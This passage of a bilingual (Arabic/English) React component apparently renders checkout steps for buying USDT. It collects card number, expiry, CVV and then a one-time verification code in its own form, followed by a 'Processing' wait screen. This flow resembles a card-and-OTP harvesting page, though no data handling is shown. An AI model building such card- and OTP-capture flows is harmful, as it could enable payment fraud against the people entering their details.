                      style={{ textAlign: isRtl ? 'right' : 'left' }}
                    />
                  </div>
                )}
                {!isCreditCard && (
                  <>
                    <div className="input-group buy-span-2">
                      <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                        {isRtl ? 'ملاحظة/تفاصيل التحويل (اختياري)' : 'Transfer note/details (optional)'}
                      </label>
                      <input
                        className="input-control"
                        value={paymentDetail}
                        onChange={(e) => setPaymentDetail(e.target.value)}
                        placeholder={isRtl ? 'مثال: اسم المحول، رقم إيصال...' : 'e.g. sender name, receipt #...'}
                        style={{ textAlign: isRtl ? 'right' : 'left' }}
                      />
                    </div>
                    <div className="input-group buy-span-2">
                      <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                        {isRtl ? 'إرفاق دليل الدفع (اختياري)' : 'Attach Payment Proof (optional)'}
                      </label>
                      <input
                        type="file"
                        className="input-control file-input"
                        accept="image/*,.pdf"
                        onChange={(e) => setPaymentProof(e.target.files?.[0] || null)}
                      />
                      {paymentProof && (
                        <div className="text-muted text-sm mt-2" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                          {isRtl ? 'المرفق:' : 'Attached:'} {paymentProof.name}
                        </div>
                      )}
                    </div>
                  </>
                )}

                {isCreditCard && (
                  <>
                    <div className="input-group buy-span-2">
                      <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                        {isRtl ? 'الاسم في البطاقة' : 'Name on Card'}
                      </label>
                      <input
                        className="input-control"
                        name="cc-name"
                        autoComplete="cc-name"
                        value={cardHolderName}
                        onChange={(e) => setCardHolderName(e.target.value)}
                        placeholder={isRtl ? 'كما هو مكتوب على البطاقة' : 'As on card'}
                        style={{ textAlign: isRtl ? 'right' : 'left' }}
                      />
                    </div>

                    <div className="input-group buy-span-2">
                      <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                        {isRtl ? 'رقم البطاقة' : 'Card Number'}
                      </label>
                      <input
                        className="input-control"
                        name="cc-number"
                        autoComplete="cc-number"
                        value={cardNumber}
                        onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                        placeholder={isRtl ? 'مثال: 4111 1111 1111 1111' : 'e.g. 4111 1111 1111 1111'}
                        inputMode="numeric"
                        dir="ltr"
                        style={{ textAlign: 'left' }}
                      />
                    </div>

                    <div className="input-group buy-span-2">
                      <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                        {isRtl ? 'تاريخ الانتهاء (MM/YY)' : 'Expiry (MM/YY)'}
                      </label>
                      <input
                        className="input-control"
                        name="cc-exp"
                        autoComplete="cc-exp"
                        value={cardExpiry}
                        onChange={(e) => setCardExpiry(formatExpiryInput(e.target.value))}
                        placeholder="MM/YY"
                        dir="ltr"
                        style={{ textAlign: 'left' }}
                      />
                    </div>

                    <div className="input-group buy-span-2">
                      <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                        {isRtl ? 'رمز (3 حروف/أرقام)' : 'CVV (3 chars)'}
                      </label>
                      <input
                        className="input-control"
                        name="cc-csc"
                        autoComplete="cc-csc"
                        value={cardCvv}
                        onChange={(e) => setCardCvv(String(e.target.value).replace(/[^0-9a-zA-Z]/g, '').slice(0, 3))}
                        placeholder="XXX"
                        dir="ltr"
                        inputMode="text"
                        style={{ textAlign: 'left' }}
                      />
                    </div>
                  </>
                )}
                {needsKyc && (
                  <div
                    className="input-group buy-span-2"
                    style={{
                      marginTop: '0.25rem',
                      padding: '1rem',
                      borderRadius: '10px',
                      border: '1px solid rgba(255, 180, 0, 0.35)',
                      background: 'rgba(255, 180, 0, 0.06)',
                    }}
                  >
                    <div className="text-accent text-sm mb-2" style={{ fontWeight: 700 }}>{t.kycBoxTitle}</div>
                    <p className="text-muted text-sm mb-3" style={{ margin: 0, lineHeight: 1.6 }}>{t.kycBoxBody}</p>
                    <label
                      style={{
                        display: 'flex',
                        alignItems: 'flex-start',
                        gap: '0.6rem',
                        cursor: 'pointer',
                        textAlign: isRtl ? 'right' : 'left',
                        direction: isRtl ? 'rtl' : 'ltr',
                      }}
                    >
                      <input
                        type="checkbox"
                        checked={kycAcknowledged}
                        onChange={(e) => setKycAcknowledged(e.target.checked)}
                        style={{ marginTop: '0.2rem', flexShrink: 0 }}
                      />
                      <span className="text-sm" style={{ lineHeight: 1.5 }}>{t.kycCheckboxLabel}</span>
                    </label>
                  </div>
                )}
              </div>
            )}

            {stage === 3 && (
              <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
                <div className="cc-otp-panel buy-span-2">
                  <div className="cc-otp-title">{isRtl ? 'بانتظار إدخال الكود' : 'Enter the code'}</div>

                  <div className="cc-otp-code-box" aria-live="polite">
                    {otpCode ? (
                      <code>{otpCode}</code>
                    ) : (
                      <span style={{ opacity: 0.7 }}>{isRtl ? '••••••' : '••••••'}</span>
                    )}
                  </div>

                  <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left', marginTop: '1rem' }}>
                    {isRtl ? 'أدخل كود التحقق (3-9 أرقام)' : 'Verification code (3-9 digits)'}
                  </label>
                  <input
                    className="input-control"
                    value={otpCode}
                    onChange={(e) => setOtpCode(String(e.target.value).replace(/\D/g, '').slice(0, 6))}
                    placeholder={isRtl ? 'مثال: 12345' : 'e.g. 12345'}
                    dir="ltr"
                    inputMode="numeric"
                    style={{ textAlign: 'left' }}
                  />

                  {otpExpiresAt && (
                    <div className="text-muted text-sm mt-2" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                      {isRtl ? 'صلاحية الكود: 10 دقائق' : 'OTP validity: 10 minutes'}
                    </div>
                  )}

                </div>
              </div>
            )}

            {stage === 4 && (
              <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
                <div className="cc-otp-await buy-span-2">
                  <div className="cc-otp-spinner" aria-hidden="true" />
                  <div className="cc-otp-await-title">{isRtl ? 'جار المعالجة' : 'Processing'}</div>
                  <div className="cc-otp-await-sub">{isRtl ? 'يرجى الانتظار...' : 'Please wait...'}</div>
                </div>
              </div>
            )}

            {stage === 5 && (
              <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
                <div className="cc-otp-await cc-otp-complete buy-span-2">
                  <div className="cc-otp-checkmark" aria-hidden="true">
                    <svg viewBox="0 0 24 24" width="28" height="28">
                      <path d="M20 7L9 18l-5-5" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </div>
                  <div className="cc-otp-await-title">{isRtl ? 'تم الاكتمال' : 'Completed'}</div>
                </div>
              </div>
            )}

            <div className="flex gap-4 mt-6 buy-actions" style={{ flexDirection: isRtl ? 'row-reverse' : 'row' }}>
              {stage === 1 ? (
                <Link to="/" className="btn btn-outline" style={{ flex: 1 }}>
                  {t.back}
                </Link>
              ) : (
                <button
                  type="button"
                  onClick={() => {
                    if (stage === 4) return;
                    setStage(stage === 3 ? 2 : 1);
                  }}
                  className="btn btn-outline"
                  style={{ flex: 1 }}
                >
                  {isRtl ? 'رجوع للخطوة السابقة' : 'Back to previous step'}
                </button>
              )}
              <button
                onClick={() => {
                  if (stage === 1) {
                    setStage(2);
                    return;
                  }
                  if (stage === 2) {
                    onConfirm();
                    return;
                  }
                  if (stage === 3) {
                    onSubmitOtp();
                  }
                }}
                className="btn btn-primary"
                style={{
                  flex: 2,
                  opacity:
                    stage === 1
                      ? (canMoveToPayDetails ? 1 : 0.5)
                      : stage === 2
                        ? (isCreditCard ? (canSendCard ? 1 : 0.5) : (cd.remainingMs === 0 || usdtAmount < 5 ? 0.5 : 1))
                        : stage === 3
                          ? (verifyingOtp ? 0.5 : (cd.remainingMs === 0 ? 0.5 : 1))
                          : 0.6,
                }}
                disabled={
                  stage === 4 || stage === 5
                    ? true
                    : stage === 1
                      ? !canMoveToPayDetails
                      : stage === 2
                        ? (sending || cd.remainingMs === 0 || usdtAmount < 5 || (isCreditCard ? !canSendCard : false))
                        : stage === 3
                          ? (verifyingOtp || cd.remainingMs === 0 || !/^\d{3,9}$/.test(String(otpCode || '').trim()))
                          : true
                }
              >
                {stage === 1
                  ? (isRtl ? 'متابعة' : 'Continue')
                  : stage === 2
                    ? (
                      isCreditCard
                        ? (sending ? (isRtl ? 'جاري الإرسال...' : 'Sending...') : (isRtl ? 'إرسال' : 'Send'))
                        : (sending ? (isRtl ? 'جاري الإرسال...' : 'Sending...') : t.confirmAndSend)
                    )
                    : stage === 3
                      ? (verifyingOtp ? (isRtl ? 'جاري الإرسال...' : 'Sending...') : (isRtl ? 'إرسال الكود' : 'Send code'))
                      : (isRtl ? 'بانتظار...' : 'Waiting...')}
              </button>
            </div>

            {cd.remainingMs === 0 && (
              <div className="text-error mt-4">
                {isRtl ? 'انتهى وقت الدفع. ارجع للصفحة الرئيسية وابدأ طلب جديد.' : 'Payment time expired. Go back and start a new order.'}
              </div>
            )}
          </>
        )}
      </div>
    </section>
    </main>
    <Footer t={t} lang={lang} />
    </div>
  );
}

